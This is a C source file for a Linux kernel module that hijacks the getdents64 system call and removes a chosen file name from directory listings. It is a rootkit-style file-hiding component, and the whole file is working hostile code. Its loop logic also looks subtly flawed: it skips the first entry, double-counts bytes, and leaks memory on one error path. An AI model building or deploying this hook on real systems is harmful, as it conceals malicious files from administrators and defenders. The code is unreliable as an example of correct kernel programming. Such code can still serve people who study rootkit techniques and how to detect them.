#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <stdbool.h>
#include "../common/syscall_hijacking/syscall_hijack.h"

// Types & other consts.
static char *file_name_to_hide = NULL;
module_param(file_name_to_hide, charp, 0600);

typedef int (*original_getdents64_t)(const struct pt_regs *regs);
static original_getdents64_t original_getdents64_ptr;

int new_getdents64(const struct pt_regs *regs) {
    int total_bytes_read = original_getdents64_ptr(regs);

    if (total_bytes_read > 0) {
        struct linux_dirent64 *buf_pointer = (struct linux_dirent64*)regs->si;
        struct linux_dirent64 *first = kmalloc(total_bytes_read, GFP_KERNEL);

        int copy_res = copy_from_user(first, buf_pointer, (unsigned long)total_bytes_read);
        if (copy_res) {
            pr_warn("Error while copying from user space! error %d", copy_res);
            return total_bytes_read;
        }

        struct linux_dirent64 *curr = first;

        int bytes_left = total_bytes_read;
        bool has_been_found = false;
        while (bytes_left > 0) { 
            bytes_left -= curr->d_reclen;
            curr = (struct linux_dirent64*)(((char*)curr) + curr->d_reclen);

            if (!strcmp(curr->d_name, file_name_to_hide)) {
                has_been_found = true;

                // Array will be shortened by the length of the member we will delete.
                total_bytes_read -= curr->d_reclen;
                bytes_left -= curr->d_reclen;
                
                struct linux_dirent64 *next_pos = (struct linux_dirent64*)(((char*)curr) + curr->d_reclen);
                memmove(curr, next_pos, bytes_left);
                continue;
            }
        }
        
        if (has_been_found) {
            copy_to_user(buf_pointer, first, total_bytes_read);
        }

        kfree(first);
    }

    return total_bytes_read;
}
 
int load(void) {
    pr_info("Initializing...");
    if (file_name_to_hide == NULL) {
        pr_warn("File name to hide has not been set! Exiting...");
        return -1;
    }

    unsigned long getdents_ptr = hijack_syscall(__NR_getdents64, (unsigned long)new_getdents64);
    if (!getdents_ptr) {
        return -1;
    }
    
    original_getdents64_ptr = (original_getdents64_t)getdents_ptr;
    pr_info("Initialized successfuly!");

    return 0;
}
 
void unload(void) {
    pr_info("Shutting down.");
    restore_syscall(__NR_getdents64, (unsigned long)original_getdents64_ptr);
    pr_info("Goodbye world...");
}

module_init(load);
module_exit(unload);

MODULE_LICENSE("GPL");